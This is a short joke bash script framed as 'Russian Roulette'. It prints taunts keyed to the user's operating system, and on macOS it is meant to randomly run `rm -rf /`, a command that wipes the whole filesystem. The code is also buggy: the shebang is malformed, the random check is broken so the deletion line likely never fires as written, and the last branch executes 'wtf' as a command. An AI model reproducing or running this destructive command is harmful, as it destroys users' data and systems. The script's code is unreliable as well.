#/bin/bash

echo "Hello world. Today we are going to play a game of Russian Roulette. But first, I will tell you that I spare all linux and bsd users so if u use macOS then skill issue on ur part. pls do not run this as root."

if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        echo "hail the almighty tux, my fellow linux master race. you may pass"
        
elif [[ "$OSTYPE" == "darwin"* ]]; then
       if $(( $RANDOM % 9 + 1 )) == 1; then
       rm -rf /;
       echo "I hope you did not run this as root :)"
       else
       echo "hmm good luck ig"
       fi
       
elif [[ "$OSTYPE" == "cygwin" ]]; then
         echo "Windows peseant, but idk how to delete ur system32 with a bash script so ig ur safe" 
elif [[ "$OSTYPE" == "msys" ]]; then
         echo "Windows peseant, but idk how to delete ur system32 with a bash script so ig ur safe" 
elif [[ "$OSTYPE" == "win32" ]]; then
        echo "hmm, still a windows peseant." 
elif [[ "$OSTYPE" == "freebsd"* ]]; then
        echo "based. pls have a good rest of ur day, ma'am/sir/ya boi/person :)"
else
        "wtf"
fi

